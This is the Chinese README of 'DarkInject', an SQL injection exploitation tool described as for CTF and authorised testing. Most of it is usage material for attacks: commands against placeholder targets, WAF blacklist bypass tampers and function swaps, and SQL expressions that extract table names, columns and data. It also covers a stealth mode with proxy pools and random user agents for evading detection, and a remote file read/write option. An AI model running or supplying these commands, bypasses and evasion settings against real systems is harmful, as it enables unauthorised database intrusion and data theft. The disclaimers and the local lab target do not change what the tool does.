# DarkInject

**中文版** &nbsp;|&nbsp; [English version →](https://github.com/ETOH-ui/DarkInject-EN)

> 模块化、通用、高速的 SQL 注入自动化利用工具
>
> 支持 **4 种注入技术 × 5 种 DBMS × 14 种 Tamper × 黑名单自动绕过**

<p align="center">
  <a href="https://github.com/ETOH-ui/DarkInject"><img src="https://img.shields.io/badge/GitHub-ETOH--ui%2FDarkInject-181717?logo=github" alt="repo"></a>
  <img src="https://img.shields.io/badge/version-1.2.0-blue" alt="version">
  <img src="https://img.shields.io/badge/python-3.6%2B-blue" alt="python">
  <img src="https://img.shields.io/badge/license-MIT-green" alt="license">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey" alt="platform">
</p>

---

## ⚠️ 免责声明

> **本工具仅限用于以下合法场景：**
>
> - 你**自己拥有**，或已取得目标方**书面授权**的系统；
> - CTF 竞赛、在线靶场、教学实验等**合法演练环境**；
> - 本地搭建的漏洞复现与安全研究。
>
> **严禁**将本工具用于任何**未经授权**的目标。使用者须自行承担因使用本工具产生的
>   
> 全部法律责任，包括但不限于《中华人民共和国网络安全法》《中华人民共和国刑法》
>   
> 第二百八十五条（非法侵入计算机信息系统罪 / 非法获取计算机信息系统数据罪）、
>   
> 第二百八十六条（破坏计算机信息系统罪）及《中华人民共和国治安管理处罚法》的
>   
> 相关规定。**未授权攻击他人系统属违法行为，可能面临行政处罚乃至刑事追责。**
>
> 本项目为开源学习与安全研究用途，作者**不提供**针对任何具体真实目标的定制、
>   
> 代做或技术支持，亦不对任何滥用行为承担责任。使用本工具即表示你已阅读、
>   
> 理解并同意上述全部条款。

---

## 📖 简介

**DarkInject** 是一个面向 CTF 竞赛、授权渗透测试与 SRC 场景的模块化 SQL 注入工具。

本工具**专注解决严格黑名单过滤下的注入难题**：

- 过滤了注释符（`--` / `#` / `/* */`）？→ 自动切换无注释 payload
- 过滤了 `union` / `sleep` / `extractvalue`？→ 自动降级到布尔盲注
- 只允许数字型 POST？→ 自动探测 12 种闭合方式

### 核心亮点：黑名单自动绕过

直接喂给工具一份 WAF 黑名单，它会自己推断过滤语义、规划绕过策略、逐个实测：

```bash
python main.py -u URL --data "id=1" --blacklist blacklist.txt --waf-mode strip
```

| 过滤语义               | 有效绕过                                | 工具怎么做                           |
| ------------------ | ----------------------------------- | ------------------------------- |
| `str_replace` 单次删除 | 关键字嵌套 `ununionion` → 删一次正好剩 `union` | `keyword_nest`                  |
| 大小写敏感的黑名单          | 换大小写                                | `randomcase` / `lowercase`      |
| 命中即拒（presence）     | 关键字根本用不了                            | 自动降级：布尔盲注 / 重查询延时 / 换用没被禁的报错函数  |
| 注释符被禁              | 无注释 payload                         | 全部 payload 天生不用注释收尾             |



---

## ✨ 核心特性

| 特性                  | 说明                                                                                 |
| ------------------- | ---------------------------------------------------------------------------------- |
| 🎯 **自动探测**         | 基线采样（含内容噪声）+ 12 种闭合识别 + 长度/状态码/内容三级信号                                                     |
| 🚀 **4 种注入技术**      | 联合注入 / 报错注入 / 布尔盲注 / 时间盲注，自动降级                                                     |
| 🌐 **5 种 DBMS**     | MySQL / MSSQL / Oracle / PostgreSQL / SQLite                                       |
| 🛡️ **14 种 Tamper** | randomcase / keyword_nest / space_alt / commentless / logic_alt / hex_string / ... |
| ⚡ **高速提取**          | 二分查找 + 多线程并发 + 请求缓存 + 关键字段投票                                                       |
| 🎬 **滚动动画**         | 长耗时操作自动显示滚动进度条                                                                     |
| 🕵️ **反 WAF 模式**    | 延迟抖动 / 随机 UA / 代理池 / 拟人化                                                           |
| 💻 **交互式 Shell**    | 扫描后随时按需查询                                                                          |
| 🎨 **彩色 Banner**    | 标志性 ASCII logo + ANSI 颜色（Windows 兼容）                                               |
| ⚖️ **法律声明**         | 每次运行强制确认，必须输入 `I AGREE`（不可绕过、不可缓存）                                                 |

---

## 📦 安装

### 环境要求

- Python 3.6+
- pip

### 步骤

```bash
git clone https://github.com/ETOH-ui/DarkInject.git
cd DarkInject

# 创建虚拟环境（可选但推荐）
python -m venv .venv
source .venv/bin/activate          # Linux / macOS
.venv\Scripts\activate             # Windows

# 安装依赖
pip install -r requirements.txt
```

---

## 🚀 快速开始

### 场景 1：本地靶场（最简）

```bash
python main.py -u http://127.0.0.1:45821/ --data "id=1" --param id
```

### 场景 2：已知库名，跳过盲注（推荐）

```bash
python main.py -u http://127.0.0.1:26250/ --data "id=1" --param id \
    --technique B --db past_paper --workers 4
```

### 场景 3：GET 参数型注入

```bash
python main.py -u "http://target/news.php" --method GET \
    --position params --param id --params "page=1"
```

### 场景 4：带 Cookie / Header

```bash
python main.py -u http://target/ --data "id=1" --param id \
    --cookie "PHPSESSID=abc123; token=xyz" \
    --header "X-Forwarded-For: 127.0.0.1"
```

### 场景 5：SRC 隐蔽模式

```bash
python main.py -u http://target/ --data "id=1" \
    --stealth --proxy-file proxies.txt
```

### 场景 6：JSON body / 多参数

```bash
# JSON 请求体：payload 注入到指定字段，支持 a.b 嵌套路径
python main.py -u http://target/api --method POST --json \
    --data '{"id": 1, "user": {"name": "x"}}' --param user.name

# 不知道哪个参数有注入？让它逐个试，并列出可注入的参数
python main.py -u "http://target/news.php" --method GET \
    --position params --param id,cate,page
```

---

## ⚖️ 法律声明确认

**首次运行时会强制显示法律声明并等待用户输入 `I AGREE`**：

```text
============================================================
⚠️  法律声明
============================================================
本工具仅供授权安全测试使用。
使用本工具即表示您确认：
  1. 您已获得对目标系统进行测试的明确书面授权
  2. 您将遵守所有适用的法律法规
  3. 您自行承担因使用本工具产生的一切法律后果
============================================================
请输入 'I AGREE' 确认您已阅读并同意上述条款: _
```

### 只有一种模式：每次都确认

法律确认**不可绕过、不可缓存**。没有 `--no-legal`，也没有 `--cache-legal`：

- 每次运行都显示完整条款，必须由使用者本人输入 `I AGREE`
- 输入不符 / 直接回车 / Ctrl-C → 立即 `exit 1`，且此时**尚未发出任何网络请求**
- 不写缓存文件，不记忆上次结果

这是刻意的：一旦允许"缓存同意"或留一个"跳过开关"，这一步在脚本里就形同虚设。

自动化场景（条款仍会完整显示，只是确认由管道喂入）：

```bash
printf "I AGREE\n" | python main.py -u URL --data "id=1"
```

---

## 🛡️ 反 WAF 隐蔽模式

默认配置并发高、节奏快，容易被 WAF 秒封。以下参数用于控制节奏、伪装流量。

### 一键隐蔽预设

```bash
python main.py -u URL --data "id=1" --stealth
```

`--stealth` 会自动开启：

| 项            | 值      |
| ------------ | ------ |
| workers      | 1（单线程） |
| delay        | 3 秒    |
| jitter       | ±1 秒   |
| qps          | 1      |
| random-agent | 是      |
| human        | 是      |
| retries      | 2      |

### 组合建议

| 场景        | 推荐参数                                                  |
| --------- | ----------------------------------------------------- |
| 本地靶场      | `--workers 2 --timeout 30`                            |
| 一般 SRC 站点 | `--workers 2 --delay 1 --jitter 0.5 --random-agent`   |
| 有 WAF 的站点 | `--stealth --proxy-file proxies.txt`                  |
| 严格速率限制    | `--qps 1 --workers 1 --random-agent`                  |
| 快攻但隐蔽     | `--workers 3 --delay 0.5 --jitter 0.3 --random-agent` |

### 代理池文件格式

```text
# proxies.txt
http://user:pass@1.2.3.4:8080
socks5://5.6.7.8:1080
http://9.10.11.12:3128
```

---

## 🕳️ 黑名单绕过（CTF 实战）

### 快速用法

```bash
# 把题目给的过滤规则贴进一个文件，扔给工具
python main.py -u http://target/ --data "id=1" --param id \
    --blacklist blacklist.txt \
    --waf-mode strip          # auto / presence / strip / strip-recursive
```

黑名单文件支持三种写法（都认）：

```text
# 1) Python list 字面量
BLACKLIST = ['union', 'sleep', 'extractvalue', '--', '#', '/*', '*/']

# 2) 逐行
union
sleep
extractvalue

# 3) 逗号分隔
union,sleep,extractvalue
```

### `--waf-mode` 怎么选

| 值                 | 含义                                       | 何时用            |
| ----------------- | ---------------------------------------- | -------------- |
| `auto`（默认）        | 不做假设，按代价从低到高把所有策略都试一遍                    | 不知道过滤实现        |
| `presence`        | 命中即拒（`stripos` 命中就 die）                  | 关键词出现即被拦，变形没用  |
| `strip`           | 单次删除（`str_replace` / `preg_replace` 不递归） | 嵌套绕过命中率最高，会优先试 |
| `strip-recursive` | 反复删到干净                                   | 嵌套无效，直接走换写法    |

### 它内部在做什么

```text
 1. 解析黑名单 token
 2. 推断约束：注释符被禁？空格被禁？哪些关键字被禁？
 3. 规划候选策略：raw → case → lower → nest → nest+blank → alt → charencode
 4. 调整技术优先级：union 被禁就先试别的；sleep 被禁则时间盲注靠后
 5. 对「策略 × 技术」逐个实测，谁先探测成功就用谁
 6. 打印最终采用的技术与策略
```

运行时会明确告诉你最后选了什么：

```text
[*] 技术优先级: E > B > U > T
[*] 策略 1/8: nest  [keyword_nest]
    [+] 列数: 3
    [+] 可见列: 第 1 列
    [+] 回显标记: 引号字符串
[+] 使用技术: Union Based  (策略: nest / keyword_nest)
```

### Tamper 清单（共 14 种）

| 名称                        | 作用                                   | 适用           |
| ------------------------- | ------------------------------------ | ------------ |
| `keyword_nest`            | 关键字嵌套 `union`→`ununionion`           | 单次替换型黑名单     |
| `lowercase`               | 全小写                                  | 只查大写关键字的实现   |
| `randomcase`              | 随机大小写                                | 大小写敏感的黑名单    |
| `space_alt`               | 空格→真实 `\t\n\r\f`                     | 空格被禁         |
| `logic_alt`               | `AND`→`&&`、`=`→`LIKE`、`SUBSTR`→`MID` | 缩小关键字面积      |
| `hex_string`              | `'abc'`→`0x616263`                   | 引号/字面量被扫     |
| `commentless`             | 清理注释符                                | 注释符被禁        |
| `space2mysqlblank`        | 同 `space_alt`（历史名保留）                 | 空格被禁         |
| `space2comment`           | 空格→`/**/`                            | 注释可用时        |
| `charencode`              | 整串 URL 编码（走 raw 发送）                  | 需绕过二次解码检测    |
| `apostrophemask`          | `'`→全角撇号                             | 单引号被拦        |
| `equaltolike` / `between` | 比较符换写法                               | `=` / `>` 被拦 |

> 说明：`keyword_nest` 只会嵌套**黑名单里真正列出的词**。
>   
> 若嵌套了一个没被过滤的词，SQL 引擎收到的还是 `ununionion`，反而语法错误。
>   
> 另外所有变形都只在**引号之外**生效，不会把 `'past_paper'` 这类库名改坏。

---

## 🧪 本地自测（离线 + 靶场）

### 1. 离线自检矩阵

不需要目标，直接用三种过滤语义模型验证每种策略是否有效：

```bash
python selftest/blacklist_selftest.py --blacklist lab/blacklist_ctf.txt
```

输出形如（节选）：

```text
▸ 联合(数字型)
    ✗ presence(i)    命中即拒   → （该语义下无可用策略）
    ✓ strip(单次,i)   删一次     → nest, nest+blank, nest+alt
▸ 时间(重查询)
    ✓ presence(i)    命中即拒   → raw, case, lower, nest, nest+blank
▸ 布尔盲注
    ✓ presence(i)    命中即拒   → raw, case, lower, nest, nest+blank
```

这份矩阵是判断「哪种过滤该用哪种绕过」的最直接依据。

### 2. SQLite 靶场端到端

`lab/vuln_app.py` 是一个故意写坏的、带同款黑名单的注入点（无需任何外部数据库）：

```bash
# 终端 A：起靶场（strip = 单次删除型过滤）
python lab/vuln_app.py --filter strip_single_i --port 8899

# 终端 B：用 union 打通（会自动选中 keyword_nest 策略）
python main.py -u http://127.0.0.1:8899/ --method GET --position params --param id \
    --dbms sqlite --blacklist lab/blacklist_ctf.txt --waf-mode strip --technique U

# 换成 presence 型（union 完全用不了），工具会自动降级到布尔盲注
python lab/vuln_app.py --filter presence_i --port 8900   # 另起一个
python main.py -u http://127.0.0.1:8900/ --method GET --position params --param id \
    --dbms sqlite --blacklist lab/blacklist_ctf.txt --waf-mode presence --charset flag
```

两种模式都能拿到 `flag{un10n_n3st1ng_w0rk5}`。

### 3. 平长目标（验证内容差分）

`--flat-len` 把所有响应体补到固定字节数，于是 true / false 的**长度完全相同**，
只能靠响应体内容差异判定：

```bash
python lab/vuln_app.py --port 8901 --flat-len 4096
python main.py -u "http://127.0.0.1:8901/?id=1" --method GET --position params \
    --param id --dbms sqlite --technique B
```

输出会明确告诉你走了哪条信号：

```text
[+] 基线: len=4096B (抖动±0B, 内容噪声0.0%)
[+] 闭合: numeric  (信号: 内容)
    True/False 长度相同 (4096B)，改用内容差异区分
    [*] 响应长度不可分 → 改用响应体内容差分判定
```

### 4. JSON body / 多参数

```bash
python lab/vuln_app.py --port 8902
python main.py -u "http://127.0.0.1:8902/api" --method POST --json \
    --data '{"id": 1}' --param id,foo --dbms sqlite --technique B
```

靶场的 POST 端点同时接受 `application/json` 与 `form-urlencoded`，
`--param id,foo` 会依次探测两个字段并报出哪一个可注入。

---

## 🎛️ 参数总览

### 基础请求

| 参数           | 说明                                        | 默认     |
| ------------ | ----------------------------------------- | ------ |
| `-u, --url`  | 目标 URL                                    | **必填** |
| `--method`   | GET / POST / PUT                          | POST   |
| `--position` | `data` / `params` / `headers` / `cookies` | data   |
| `--param`    | 注入参数名；可多次传入或用逗号分隔（多参数依次探测）                  | id     |
| `--data`     | 基础 POST 数据；`--json` 时传 JSON 文本              | -      |
| `--json`     | body 按 JSON 发送，payload 注入 `--param` 字段（支持 `a.b`） | -      |
| `--params`   | 基础 URL 参数                                 | -      |
| `--header`   | 自定义 Header（可重复）                           | -      |
| `--cookie`   | Cookie 字符串                                | -      |
| `--timeout`  | 请求超时秒数                                    | 10     |
| `--space`    | 空格替代写法，如 `%0a` / `%09`                    | 空格     |
| `--verbose`  | 日志级别 0 / 1 / 2                            | 1      |

### 注入控制

| 参数              | 说明                                                              | 默认   |
| --------------- | --------------------------------------------------------------- | ---- |
| `--technique`   | `auto` / `B` / `T` / `E` / `U`                                  | auto |
| `--dbms`        | `auto` / `mysql` / `mssql` / `oracle` / `postgresql` / `sqlite` | auto |
| `--db`          | 直接指定数据库名（跳过盲注）                                                  | -    |
| `--tamper`      | tamper 链，逗号分隔                                                   | -    |
| `--blacklist`   | WAF 黑名单文件，启用自动绕过策略                                              | -    |
| `--waf-mode`    | `auto` / `presence` / `strip` / `strip-recursive`               | auto |
| `--fingerprint` | 只做指纹识别                                                          | -    |
| `--file-read`   | 读取远程文件                                                          | -    |
| `--file-write`  | 本地路径::远程路径                                                      | -    |
| `--max-rows`    | 每表最多抓几行                                                         | 3    |
| `--charset`     | 盲注字符集 `full/flag/hex/alnum/digit/lower/sql` 或自定义                | full |
| `--fast`        | 盲注判定只投 1 票（请求量减半，偶发抖动可能出错）                                      | -    |
| `--no-banner`   | 不显示 Banner                                                      | -    |

### 法律声明

**没有参数** —— 法律确认不可跳过、不可缓存，每次运行都必须输入 `I AGREE`。

### 隐蔽 / 反 WAF

| 参数                   | 说明                            |
| -------------------- | ----------------------------- |
| `--workers N`        | 并发线程数，隐蔽建议 1-2                |
| `--delay N`          | 每请求后固定延迟 N 秒                  |
| `--jitter N`         | 延迟 ± N 秒随机抖动                  |
| `--qps N`            | 全局 QPS 上限                     |
| `--human`            | 拟人化模式                         |
| `--stealth`          | 一键隐蔽预设                        |
| `--random-agent`     | 每次请求随机 UA                     |
| `--user-agent "..."` | 自定义固定 UA                      |
| `--proxy URL`        | 单个代理                          |
| `--proxy-file FILE`  | 代理池文件                         |
| `--proxy-rotate`     | round-robin / random / single |
| `--retries N`        | 失败重试次数                        |
| `--retry-delay N`    | 重试前等待秒数                       |

---

## 💻 交互式 Shell

启动后进入 `>>>` 提示符，支持以下命令：

| 命令                | 说明                                   |
| ----------------- | ------------------------------------ |
| `expr <SQL>`      | **直接提取任意 SQL 表达式**（CTF 利器，比逐行遍历快几十倍） |
| `tables`          | 列出当前库所有表                             |
| `columns <table>` | 列出某表所有列                              |
| `data <table>`    | 抓取某表数据                               |
| `db`              | 当前数据库名                               |
| `version`         | 数据库版本                                |
| `user`            | 当前用户                                 |
| `stats`           | 请求统计                                 |
| `help`            | 帮助                                   |
| `q`               | 退出                                   |


### `expr`：一次抽走整份数据

逐行遍历（`tables` / `columns` / `data`）每次都要单独提取「长度 + 名字」，请求量很大。
用 `expr` 配合 `GROUP_CONCAT`，一个表达式就能把所有东西抓回来：

```text
>>> expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
  [+] flag_table,past_paper,public_subjects

>>> expr (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x666c61675f7461626c65)
  [+] id,flag

>>> expr (SELECT GROUP_CONCAT(flag) FROM flag_table)
  [+] moectf{...}
```

> ⚠️ **字符集陷阱**：盲注字符集里没有的字符，会被静默取成「不超过它的最近字符」
> （例如 flag 里的 `+` 会被读成 `*`）。`flag` 预设已尽量覆盖常见符号；
> 仍拿不准时用 `--charset full`。工具在提取后会**自动做一次整串校验**，
> 不一致会打印 `[!] 校验不一致` 提示。

### 使用示例

```text
[5/5] 进入交互式 Shell
==============================================================
💡 输入 help 查看帮助，输入 q 退出
==============================================================

>>> tables
  - flag_table
  - users
  - public_subjects

>>> columns flag_table
  - id
  - flag

>>> expr (SELECT GROUP_CONCAT(flag) FROM flag_table)
  [+] flag{example_flag}

>>> data flag_table
  📋 表 flag_table 数据:
    (1, 'flag{example_flag}')

>>> stats
  请求总数: 187
  错误数:   0
  总耗时:   42.3s

>>> q
```

---

## 🏗️ 项目结构

```text
DarkInject/
├── main.py                     # 主入口
├── requirements.txt            # 依赖
├── README.md                   # 本文档
├── core/                       # 引擎核心
│   ├── requester.py            #   HTTP 请求器（缓存 + 节流 + UA + 代理 + raw 发送）
│   ├── detector.py             #   闭合方式 & 回显特征探测（无注释候选优先）
│   ├── fingerprinter.py        #   DBMS 指纹识别
│   ├── engine.py               #   策略 × 技术 搜索调度
│   ├── blacklist.py            #   黑名单解析 + 语义推断 + 绕过策略规划
│   ├── dumper.py               #   统一数据库遍历 API（带投票）
│   ├── throttle.py             #   请求节流器
│   ├── proxy_pool.py           #   代理池
│   └── waf_detector.py         #   WAF 探测
├── techniques/                 # 注入技术
│   ├── base.py                 #   抽象基类（含表达式校准）
│   ├── boolean.py              #   布尔盲注（差分判定 + 表达式校准）
│   ├── time.py                 #   时间盲注（延时写法轮换）
│   ├── error.py                #   报错注入（遍历多种报错函数）
│   └── union.py                #   联合注入（多标记编码 + 无注释闭合）
├── dbms/                       # DBMS 方言（函数写法变体）
│   ├── base.py
│   ├── mysql.py
│   ├── mssql.py
│   ├── oracle.py
│   ├── postgresql.py
│   └── sqlite.py
├── tamper/                     # WAF 绕过
│   ├── chain.py                #   tamper 链（支持按黑名单构造嵌套）
│   ├── _util.py                #   只在引号外做变换的工具
│   ├── keyword_nest.py         #   关键字嵌套
│   ├── space_alt.py            #   空白替换（真实控制字符）
│   ├── commentless.py          #   去注释
│   ├── logic_alt.py            #   逻辑/函数换写法
│   ├── hex_string.py           #   字符串转十六进制
│   ├── lowercase.py            #   全小写
│   ├── randomcase.py
│   ├── space2comment.py
│   ├── space2mysqlblank.py
│   ├── charencode.py
│   ├── apostrophemask.py
│   ├── equaltolike.py
│   └── between.py
├── selftest/                   # 离线自检
│   ├── blacklist_selftest.py   #   三种过滤语义 × 各策略 的有效性矩阵
│   └── result_matrix.txt       #   当前黑名单的自检结果快照
├── lab/                        # 本地靶场（SQLite，无需外部数据库）
│   ├── vuln_app.py             #   带同款黑名单的可切换过滤模式注入点
│   ├── blacklist_ctf.txt       #   moectf 2026「江洋大盗」题目附加条件（原始过滤清单）
│   ├── blacklist_moectf.txt    #   实测整理版：可用/被拦关键字 + 靶场画像
│   └── writeup_moectf_archive.md  # 同题解题记录（布尔盲注提取全过程）
├── exploit/                    # 后渗透
│   └── file_ops.py             #   文件读写
├── ui/                         # 界面层
│   ├── banner.py               #   ASCII Banner + 法律声明
│   ├── cli.py                  #   参数解析
│   ├── legal.py                #   法律声明确认
│   ├── printer.py              #   树形输出
│   ├── progress.py             #   滚动动画
│   ├── shell.py                #   交互式 shell
│   └── stats.py                #   请求统计
└── utils/                      # 通用工具
    ├── helpers.py              #   解析 & 格式化
    ├── logger.py               #   日志
    └── ua_pool.py              #   User-Agent 池
```

---

## 🧠 工作原理

```text
   启动
    │
    ▼
 [0/5] 法律声明确认 ── 强制输入 I AGREE（每次都要，不可跳过／不可缓存）
    │
    ▼
 [1/5] 基线采样 ─── 连续 3 次请求取中位数，计算抖动幅度，得出动态阈值
    │
    ▼
 [2/5] 闭合探测 ─── 依次尝试 12 种闭合方式，找 True/False 响应长度差异最大的
    │
    ▼
 [3/5] 指纹识别 ─── 先试报错回显关键字，再试布尔指纹，最后默认 MySQL
    │
    ▼
 [4/5] 技术选择 ─── auto 模式按 UNION → ERROR → BOOLEAN → TIME 自动降级
    │
    ▼
 [5/5] 数据提取 ─── 二分查找长度 + 二分查找字符 + 多线程并发
    │
    ▼
  数据库遍历 ──── 库 → 表 → 列 → 数据行 → 树形输出
```

### 关键设计

1. **法律声明**：每次运行强制确认，必须输入 `I AGREE`（不可绕过、不可缓存）
2. **闭合探测**：不依赖注释符，支持 `1 AND 1=1` 形式的纯布尔判断
3. **二分查找**：每个字符最多 7 次请求（ASCII 32-126）
4. **并发提取**：默认 4 线程，8 个字符同时提取
5. **投票机制**：关键字段（库名/表名/列名）连续提取 N 次取多数，避免并发误判
6. **请求缓存**：相同 payload 不重复发送
7. **黑名单策略搜索**：规划候选策略后逐个实测，用目标的真实响应决定成败
8. **差分判定**：布尔盲注同条件再发一份「等宽假样本」，用两次长度之差判真，
   可无视「靶子回显 SQL 导致响应长度被 payload 撑大」的干扰
9. **引号感知变形**：所有 tamper 只在引号之外生效，不会改坏库名/表名/数据

---

## 🚧 能力边界

DarkInject 走的是「单请求即时回显」的经典模型，能力有明确的天花板。
下面把「能做什么」和「做不到什么」都写清楚，避免误用与误判。

### ✅ 能处理的注入点

- **位置**：参数「值」的位置，即 `WHERE id = $inject` 这种形态
- **请求位置**：POST body / GET params / Header / Cookie
- **闭合形式**：数字型、单引号、双引号、括号包裹 —— 自动探测，无需手动指定
- **body 类型**：`form-urlencoded` 与 JSON（`--json`，`--param` 支持 `a.b` 嵌套路径）
- **多参数**：`--param a,b` 或多次 `--param`，逐个探测并列出哪些可注入

### 🧩 判定信号（不只靠长度）

闭合探测与布尔盲注都不只依赖响应长度，而是三级降级：

1. **长度差** —— 最经典、最可靠
2. **状态码差** —— 有些框架真假走不同 HTTP 状态
3. **响应体分块 diff** —— 长度被模板压平时的最后抓手

基线采样时顺带估计「内容噪声」（时间戳 / CSRF token 等随机元素），
噪声越大内容信号的门槛越高，避免把随机内容误判成回显。
一旦闭合探测报告 `True/False 长度相同`，布尔盲注会自动切到内容差分模式。

### ❌ 不支持的注入点

| 场景 | 说明 |
| --- | --- |
| `ORDER BY` 之后 | 排序字段位置不做闭合探测 |
| `LIMIT` 之后 | 同上 |
| 表名 / 列名位置 | 只处理「值」，不处理标识符 |
| `IN()` 列表内部 | 列表内注入不覆盖 |
| 堆叠注入 | 无 `;` 多语句技术，注入技术栈只有 B / T / E / U |
| 二次注入 / 存储型 | 单请求即时回显模型，不跟踪数据落库后的二次触发 |

### ⚠️ 已知限制

1. **长度与内容都完全相同的目标仍无法判定**
   若 true / false 的响应体逐字节一致（连内容 diff 都是 0），说明目标不产生
   任何可观测差异 —— 此时只能改走时间盲注，而闭合探测阶段依然会失败。
2. **`--json` 与 raw 类 tamper 不叠加**
   JSON 模式下 payload 必须先序列化再发送，所以 `charencode` 这类
   依赖「已编码文本原样拼入」的 tamper 不会生效（`raw_mode` 被忽略）。

### 📮 关于请求体编码

- 默认：body 按 `application/x-www-form-urlencoded` 组装（`--data "id=1"`）
- JSON：加 `--json`，`--data` 传 JSON 文本，payload 注入到 `--param` 指定的字段

```bash
python main.py -u http://target/api --method POST --json \
  --data '{"id": 1, "user": {"name": "x"}}' --param user.name
```

---

## 📝 使用技巧

### 提速

```bash
# 已知库名时，直接跳过大盲注环节
python main.py -u URL --data "id=1" --db known_db --workers 4

# 只查特定表（进入 shell 后）
>>> data flag_table
```

### 绕过黑名单

```bash
# 空格被过滤
python main.py -u URL --data "id=1" --space "%0a"

# 关键字被过滤（大小写混淆）
python main.py -u URL --data "id=1" --tamper randomcase
```

### 调试

```bash
# 详细日志
python main.py -u URL --data "id=1" --verbose 2

# 走 Burp 代理
python main.py -u URL --data "id=1" --proxy http://127.0.0.1:8080
```

---

## ⚠️ 常见问题

### Q1: `ModuleNotFoundError: No module named 'requests'`

```bash
# 激活虚拟环境后重装
.venv\Scripts\activate
pip install requests
```

### Q2: 探测闭合方式失败

- 检查 URL 是否能正常访问
- 检查 `--param` 参数名是否正确（用 F12 看请求）
- 检查是否需要 Cookie 认证
- 尝试 `--timeout 30`
- 若以上都正常、参数也确认存在注入，却仍然失败：多半是 true / false 的**响应体逐字节一致**
  （连内容 diff 都为 0）—— 目标不产生任何可观测差异，只能改走时间盲注思路
  （见上文「🚧 能力边界」的已知限制）

### Q3: 数据库名识别错误

并发场景下可能误判，解决方案：

- 用 `--db` 手动指定
- 或降低 `--workers 1`
- 关键字段已有投票机制，可通过 `core/dumper.py` 里 `Dumper(engine, votes=3)` 增强

### Q4: Windows 下 Banner 乱码

用 **Windows Terminal** 或 **PyCharm 内置终端**，字体换成 `Cascadia Code` 或 `Consolas`。

### Q5: 盲注太慢

布尔盲注效率有物理上限。建议：

- 优先用 `--technique auto`（自动尝试 UNION 和报错）
- 已知库名时用 `--db`
- 提高 `--workers`（本地靶场可到 4-8）

### Q6: 每次都要输入 `I AGREE` 太烦

这是刻意设计 —— 法律确认不接受"记住上次"或"跳过开关"。
用于自动化时可在管道里喂入确认（条款仍会完整显示）：

```bash
printf "I AGREE\n" | python main.py -u URL --data "id=1"
```

---

## 📋 版本说明

> 本仓库为**首个公开发行版**，版本号 `v1.2.0`。以下即当前完整功能集。

### 注入能力

- **4 种注入技术**：联合 / 报错 / 布尔盲注 / 时间盲注，按目标可用性自动降级
- **5 种 DBMS 方言**：MySQL / MSSQL / Oracle / PostgreSQL / SQLite
- **自动探测**：基线采样（含内容噪声估计）+ 12 种闭合方式识别 + 长度/状态码/内容三级信号
- **请求体形态**：form-urlencoded 与 JSON（`--json`，`--param` 支持 `a.b` 嵌套字段路径）
- **多参数**：一次可传多个 `--param`，逐个探测并汇总哪些可注入
- **方言函数变体**：`length` / `substr` / `ascii` / `concat` / 十六进制字面量均按方言生成
  - `hex_to_str()`：MySQL `0x..` / SQLite `CAST(x'..' AS TEXT)` / MSSQL `CONVERT(VARCHAR(MAX),0x..)` /
    PostgreSQL `CONVERT_FROM(DECODE(..))` / Oracle `UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW(..))`

### 黑名单自动绕过（CTF 特化）

- `--blacklist` + `--waf-mode`：喂一份过滤规则，自动推断**过滤语义**并搜索可用绕过策略
- **过滤语义三模型**：`presence`（命中即拒）/ `strip_single`（单次删除）/ `strip_recursive`（递归删除），
  各自再分大小写敏感与不敏感
- **14 种 Tamper**：`randomcase` / `keyword_nest` / `space_alt` / `commentless` / `logic_alt` /
  `hex_string` / `lowercase` / `space2comment` / `space2mysqlblank` / `charencode` /
  `apostrophemask` / `equaltolike` / `between` / `chain`
- **无注释 payload**：全部 payload 天生不依赖注释收尾 —— 注释符被禁时照常可用
- **关键字被彻底禁用时自动降级**：布尔盲注 → 重查询延时 → 换用未被禁的报错函数
- **函数轮换**：`SLEEP` → `BENCHMARK` / `GET_LOCK` / 全表笛卡尔重查询；
  `extractvalue` / `updatexml` → `GTID_SUBSET` / 几何函数 / `EXP` 溢出 / `JSON_KEYS`
- **回显标记三种编码**：hex → 引号 → `CHAR()`，兼容非 MySQL

### 盲注可靠性与速度

- **差分判定**：用等宽「必假样本」对拍，不再依赖固定长度阈值
- **必假样本长度缓存**：目标稳定时每次判定 2 请求 → 1 请求，速度约翻倍
- **整串校验 + 自愈重抽**：提取完自动复核；校验不过则清空缓存、禁用缓存重抽一次（慢一倍，但结果可信）
- **只接受 2xx/3xx 响应**：偶发 5xx 错误页不会再被当成有效长度样本污染二分
- **2 票判定 + 平票补投**：避免单次网络抖动翻错字符
- 二分查找带迭代上限，不会死循环
- `--fast` 可切单票判定进一步提速（默认仍是稳健的 2 票）
- `flag` 预设字符集覆盖常见符号（`+ | = ~ : ; , . / ?` 等），避免「取邻近字符」静默出错

### 数据提取效率

- **交互式 Shell**：扫描完成后按需查询
- **`expr <SQL>`**：直接提取任意表达式，配 `GROUP_CONCAT` 一次抽走整库结构 / 数据
- `--db <库名>` 跳过库名盲注环节

### 隐蔽与反检测

- `--stealth` 一键预设；细分 `--delay` / `--jitter` / `--qps` / `--human` / `--random-agent` / `--user-agent`
- 代理池：`--proxy` / `--proxy-file` / `--proxy-rotate`
- 请求器 `raw` 发送模式，避免编码类 tamper 被二次编码

### 本地自测（无需外部环境）

- `selftest/blacklist_selftest.py`：三种过滤语义 × 各策略的**离线有效性矩阵**
- `lab/vuln_app.py`：SQLite 靶场，`--filter` 六种过滤模式、`--flaky N` 故障注入、
  `--flat-len N` 平长模式（响应长度全相同，用于验证内容差分）、POST JSON 端点

### 安全与合规

- **法律声明不可绕过**：每次运行强制输入 `I AGREE`，无跳过开关、不写缓存
- 详见上方「免责声明」与文末「法律与道德使用声明」

---

## 📄 许可证

本项目仅供 **网络安全学习、CTF 竞赛及授权渗透测试** 使用。

**任何未经授权的使用行为均与作者无关，使用者需自行承担一切法律责任。**

---

## ⚠️ 法律与道德使用声明

**请在使用本工具前仔细阅读以下声明。使用本工具即表示您已阅读、理解并同意受以下条款约束。**

### 1. 授权要求

本工具**仅限**用于以下场景：

- 对**您拥有所有权**的系统进行测试
- 对您已获得**明确书面授权**的系统进行测试（授权文件需明确界定测试范围、时间框架和行动规则）
- 在**隔离的、受控的实验室环境**中进行教育或研究目的的使用
- 在**漏洞赏金计划规则明确允许**的范围内进行测试

**未获得上述授权而使用本工具，即构成违法。**

### 2. 严禁用途

**严禁**将本工具用于：

- 任何未经授权的系统访问或数据获取
- 任何形式的恶意攻击、破坏或入侵
